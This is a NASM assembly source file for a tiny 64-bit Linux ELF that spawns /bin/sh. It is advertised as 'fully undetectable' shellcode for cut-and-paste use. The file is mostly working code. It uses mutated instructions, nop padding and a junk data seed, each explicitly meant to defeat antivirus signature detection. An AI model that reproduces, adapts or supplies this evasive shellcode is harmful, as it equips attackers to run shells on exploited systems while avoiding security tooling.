;
;      ooo           ***           ...           ...           ...
;     (o o)         (o o)         (- -)         (. .)         (* *)
; ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-
;
; Fully Undetectable exec /bin/sh program. No AV trigger.
; Generated from a script by CH405.
; Thx to 0x00000000 for idea. ^^
; Create smallest binary or cut and paste for shellcode use.
; Example compile: nasm -o shellexec -s shellexec.asm
; Will make elf binary at 160-164 byte only!
; Do not forget to chmod +x shellexec
;
; Have happy fun! Do not be bad man. Do not be illegal man
;
; Generate 2024-10-10 22:37:29

bits 64
            org 0x08048000

; Keep binary small with own elf header.
ehdr:                                           ; Elf64_Ehdr
            db  0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
    times 8 db  0
            dw  2                               ;   e_type
            dw  62                              ;   e_machine
            dd  1                               ;   e_version
            dq  _start                          ;   e_entry
            dq  phdr - $$                       ;   e_phoff
            dq  0                               ;   e_shoff
            dd  0                               ;   e_flags
            dw  ehdrsize                        ;   e_ehsize
            dw  phdrsize                        ;   e_phentsize
            dw  1                               ;   e_phnum
            dw  0                               ;   e_shentsize
            dw  0                               ;   e_shnum
            dw  0                               ;   e_shstrndx

ehdrsize    equ $ - ehdr

phdr:                                           ; Elf64_Phdr
            dd  1                               ;   p_type
            dd  5                               ;   p_flags
            dq  0                               ;   p_offset
            dq  $$                              ;   p_vaddr
            dq  $$                              ;   p_paddr
            dq  filesize                        ;   p_filesz
            dq  filesize                        ;   p_memsz
            dq  0x1000                          ;   p_align

phdrsize    equ     $ - phdr

_start:
    nop				; No operation, Actually do nothing.
    nop				; No operation, Actually do nothing.
    mov rax, 0x68732f6e69622f 	; mov  value "/bin/sh" in hex to rax
    push rax
    push rsp
    pop rdi
    nop				; No operation, Actually do nothing.
    and eax, 0			; Random way to make eax equal 0
    push rax
    mov al, 178			; Mutate function, start with random value
    sub al, 132			; sub random value
    add al, 13			; make sure al has value 59 for exec syscall
    push rsp
    pop rdx
    push rsp
    pop rsi
    syscall 			; calling function 59, exec
filesize      equ     $ - $$

; Insert generate junk. Can be removed but only add 8-10 bytes.
; Make signature identification almost impossible.
section .data
seed db "!0|^UjOI"
